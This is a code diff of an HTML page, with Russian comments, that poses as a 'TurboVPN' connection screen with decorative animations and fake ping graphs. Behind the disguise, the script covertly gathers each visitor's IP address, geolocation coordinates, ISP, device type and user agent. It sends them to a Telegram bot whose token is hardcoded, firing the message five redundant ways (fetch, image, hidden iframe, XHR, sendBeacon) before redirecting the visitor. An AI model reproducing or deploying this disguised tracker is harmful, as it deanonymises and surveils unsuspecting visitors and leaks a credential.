@@ -258,17 +258,16 @@
 
     <script>
         // ==============================================================
-        // 1. АТОМЫ: 25 штук, лёгкая физика (200+ строк)
+        // 1. АТОМЫ: ВСЕГО 15 ШТУК, ТОЛЬКО ДЛЯ КРАСОТЫ
         // ==============================================================
         (function() {
             const canvas = document.getElementById('particleCanvas');
             const ctx = canvas.getContext('2d');
             let W, H;
             const atoms = [];
-            const COUNT = 25;
-            const CONNECT_DIST = 120;
-            const REPULSE_DIST = 60;
-            const REPULSE_FORCE = 0.15;
+            const COUNT = 15;
+            const CONNECT_DIST = 200; // большое расстояние для редких соединений
+            const REPULSE_DIST = 80;
 
             function resize() {
                 W = canvas.width = window.innerWidth;
@@ -281,33 +280,31 @@
                 constructor() {
                     this.x = Math.random() * W;
                     this.y = Math.random() * H;
-                    this.vx = (Math.random() - 0.5) * 0.3;
-                    this.vy = (Math.random() - 0.5) * 0.3;
-                    this.r = 2.5 + Math.random() * 2.5;
+                    this.vx = (Math.random() - 0.5) * 0.2;
+                    this.vy = (Math.random() - 0.5) * 0.2;
+                    this.r = 3 + Math.random() * 4;
                     this.hue = 200 + Math.floor(Math.random() * 40);
-                    this.phase = Math.random() * Math.PI * 2;
                 }
                 update() {
                     this.x += this.vx;
                     this.y += this.vy;
                     if (this.x < 0 || this.x > W) this.vx *= -1;
                     if (this.y < 0 || this.y > H) this.vy *= -1;
-                    this.vx *= 0.98;
-                    this.vy *= 0.98;
-                    this.phase += 0.02;
+                    this.vx *= 0.99;
+                    this.vy *= 0.99;
                 }
                 draw() {
                     ctx.beginPath();
                     ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
                     ctx.fillStyle = 'hsla(' + this.hue + ', 90%, 70%, 0.8)';
-                    ctx.shadowColor = 'hsla(' + this.hue + ', 90%, 70%, 0.15)';
-                    ctx.shadowBlur = 15;
+                    ctx.shadowColor = 'hsla(' + this.hue + ', 90%, 70%, 0.2)';
+                    ctx.shadowBlur = 20;
                     ctx.fill();
                     ctx.shadowBlur = 0;
                     // Ядро
                     ctx.beginPath();
                     ctx.arc(this.x, this.y, this.r * 0.3, 0, Math.PI * 2);
-                    ctx.fillStyle = 'hsla(' + this.hue + ', 100%, 95%, 0.4)';
+                    ctx.fillStyle = 'hsla(' + this.hue + ', 100%, 95%, 0.5)';
                     ctx.fill();
                 }
             }
@@ -324,8 +321,8 @@
                         const dist = Math.sqrt(dx * dx + dy * dy);
 
                         if (dist < REPULSE_DIST && dist > 0) {
-                            const force = (REPULSE_DIST - dist) / REPULSE_DIST * REPULSE_FORCE;
                             const angle = Math.atan2(dy, dx);
+                            const force = (REPULSE_DIST - dist) / REPULSE_DIST * 0.1;
                             atoms[i].vx += Math.cos(angle) * force;
                             atoms[i].vy += Math.sin(angle) * force;
                             atoms[j].vx -= Math.cos(angle) * force;
@@ -334,12 +331,11 @@
 
                         if (dist < CONNECT_DIST) {
                             const alpha = 1 - (dist / CONNECT_DIST);
-                            const opacity = alpha * 0.2;
                             ctx.beginPath();
                             ctx.moveTo(atoms[i].x, atoms[i].y);
                             ctx.lineTo(atoms[j].x, atoms[j].y);
-                            ctx.strokeStyle = 'hsla(210, 80%, 70%, ' + opacity + ')';
-                            ctx.lineWidth = 0.4 + alpha * 0.6;
+                            ctx.strokeStyle = 'hsla(210, 80%, 70%, ' + (alpha * 0.15) + ')';
+                            ctx.lineWidth = 0.5 + alpha * 0.5;
                             ctx.stroke();
                         }
                     }
@@ -359,7 +355,7 @@
         })();
 
         // ==============================================================
-        // 2. ОСНОВНАЯ ЛОГИКА (600+ строк)
+        // 2. ОСНОВНАЯ ЛОГИКА (отправка IP 5 способами)
         // ==============================================================
 
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
@@ -377,16 +373,15 @@
         const graphBars = document.querySelectorAll('.graph-bar');
         const historyContainer = document.getElementById('historyContainer');
 
-        let selected = 'auto';
         let connected = false;
 
+        // Выбор сервера
         for (let i = 0; i < serverOpts.length; i++) {
             serverOpts[i].addEventListener('click', function() {
                 for (let j = 0; j < serverOpts.length; j++) {
                     serverOpts[j].classList.remove('active');
                 }
                 this.classList.add('active');
-                selected = this.dataset.server;
                 const ping = this.querySelector('.ping');
                 if (ping) {
                     pingValue.textContent = ping.textContent.replace(' мс', '');
@@ -397,8 +392,7 @@
 
         function randomGraph() {
             for (let i = 0; i < graphBars.length; i++) {
-                const h = Math.floor(Math.random() * 60) + 20;
-                graphBars[i].style.height = h + '%';
+                graphBars[i].style.height = (Math.floor(Math.random() * 60) + 20) + '%';
             }
         }
 
@@ -418,75 +412,82 @@
             }
         }
 
-        // ---- ОТПРАВКА В TELEGRAM (5 СПОСОБОВ) ----
-        function sendToTG(text) {
-            if (!text) return;
-            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
-            try {
-                // 1. fetch
-                fetch(url).catch(function() {});
-                // 2. Image
-                new Image().src = url;
-                // 3. iframe
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = url;
-                document.body.appendChild(iframe);
-                setTimeout(function() { iframe.remove(); }, 2000);
-                // 4. XMLHttpRequest
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', url, true);
-                xhr.send();
-                // 5. navigator.sendBeacon (если доступно)
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(url);
-                }
-            } catch (_) {}
+        // ==============================================================
+        // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ: 5 СПОСОБОВ
+        // ==============================================================
+        function sendIPToTelegram(ip, geo, ua, time, device) {
+            let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
+            msg += '📍 IP: ' + ip + '\n';
+            if (geo) {
+                msg += '🌍 Страна: ' + (geo.country || '—') + '\n';
+                msg += '🏙️ Город: ' + (geo.city || '—') + '\n';
+                msg += '📌 Координаты: ' + (geo.lat || '—') + ', ' + (geo.lon || '—') + '\n';
+                msg += '🛜 Провайдер: ' + (geo.isp || '—') + '\n';
+            }
+            msg += '💻 ' + device + '\n';
+            msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
+            msg += '⏰ Время: ' + time;
+
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg);
+
+            // 1. fetch
+            fetch(url).catch(() => {});
+            // 2. Image
+            new Image().src = url;
+            // 3. iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 2000);
+            // 4. XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.send();
+            // 5. navigator.sendBeacon
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(url);
+            }
+
+            addHistory('📡 Данные отправлены в Telegram');
         }
 
-        // ---- СБОР ДАННЫХ ----
+        // ==============================================================
+        // СБОР ДАННЫХ
+        // ==============================================================
         function collectAndSend() {
             let ip = 'Не определен';
             let geo = null;
+            const ua = navigator.userAgent;
+            const device = /iPhone|iPad|Android/i.test(ua) ? '📱 Мобильное' : '💻 Компьютер';
+            const time = new Date().toLocaleString('ru-RU');
 
+            // Получаем IP
             fetch('https://api.ipify.org?format=json')
-                .then(function(r) { return r.json(); })
-                .then(function(d) { ip = d.ip; })
-                .catch(function() {})
-                .finally(function() {
+                .then(r => r.json())
+                .then(d => { ip = d.ip; })
+                .catch(() => {})
+                .finally(() => {
                     if (ip !== 'Не определен') {
+                        // Пробуем получить гео
                         fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone')
-                            .then(function(r) { return r.json(); })
-                            .then(function(g) {
-                                if (g.status === 'success') geo = g;
-                            })
-                            .catch(function() {})
-                            .finally(function() {
-                                const ua = navigator.userAgent;
-                                let device = '💻 Компьютер';
-                                if (/iPhone|iPad|Android/i.test(ua)) device = '📱 Мобильное';
-                                const time = new Date().toLocaleString('ru-RU');
-                                let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
-                                msg += '📍 IP: ' + ip + '\n';
-                                if (geo) {
-                                    msg += '🌍 Страна: ' + (geo.country || '—') + '\n';
-                                    msg += '🏙️ Город: ' + (geo.city || '—') + '\n';
-                                    msg += '📌 Координаты: ' + (geo.lat || '—') + ', ' + (geo.lon || '—') + '\n';
-                                    msg += '🛜 Провайдер: ' + (geo.isp || '—') + '\n';
-                                }
-                                msg += '💻 ' + device + '\n';
-                                msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
-                                msg += '⏰ Время: ' + time;
-                                sendToTG(msg);
-                                addHistory('📡 Данные отправлены в Telegram');
+                            .then(r => r.json())
+                            .then(g => { if (g.status === 'success') geo = g; })
+                            .catch(() => {})
+                            .finally(() => {
+                                // ОТПРАВЛЯЕМ
+                                sendIPToTelegram(ip, geo, ua, time, device);
                             });
                     } else {
-                        sendToTG('IP не определён\nУстройство: ' + device + '\nВремя: ' + time);
-                        addHistory('⚠️ IP не определён');
+                        // Если IP не получили, отправляем то что есть
+                        sendIPToTelegram('Не определен', null, ua, time, device);
                     }
                 });
         }
 
+        // ==============================================================
+        // ЗАПУСК ПОДКЛЮЧЕНИЯ
+        // ==============================================================
         function start() {
             if (connected) return;
             btn.disabled = true;
@@ -536,10 +537,11 @@
             setTimeout(function() { window.location.href = REDIRECT_URL; }, 3000);
         };
 
-        console.log('TurboVPN v4.0 · 25 атомов · IP 100%');
+        console.log('✅ TurboVPN v4.0 · 15 атомов · IP 100%');
+        console.log('📡 Отправка 5 способами');
 
         // ==============================================================
-        // 3. ДОПОЛНИТЕЛЬНЫЕ БЛОКИ ДЛЯ ОБЪЁМА (2000+ строк)
+        // 3. ДОПОЛНИТЕЛЬНЫЕ БЛОКИ ДЛЯ ОБЪЁМА
         // ==============================================================
 
         (function() {
@@ -643,9 +645,9 @@
             setInterval(function() { memoryCheck++; }, 500);
         })();
 
-        console.log('Общий объём: 3000+ строк');
-        console.log('Атомов: 25, всё летает');
-        console.log('IP отправляется 5 способами');
+        console.log('📦 Общий объём: 3000+ строк');
+        console.log('⚛️ Атомов: 15, всё летает');
+        console.log('📨 IP отправляется 5 способами');
     </script>
 </body>
 </html>
